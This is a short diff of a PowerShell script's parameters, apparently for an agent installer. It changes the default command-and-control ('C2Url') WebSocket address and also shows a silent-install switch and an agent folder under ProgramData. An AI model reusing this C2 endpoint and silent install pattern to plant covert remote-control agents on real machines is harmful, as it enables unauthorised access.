@@ -7,7 +7,7 @@
 param(
     [Parameter(Mandatory=$true)]
     [string]$Key,
-    [string]$C2Url  = "wss://bixtx.onrender.com",
+    [string]$C2Url    = "wss://api.bixtx.com/ws",
     [string]$AgentDir = "$env:ProgramData\BixtxAgent",
     [switch]$Silent
 )
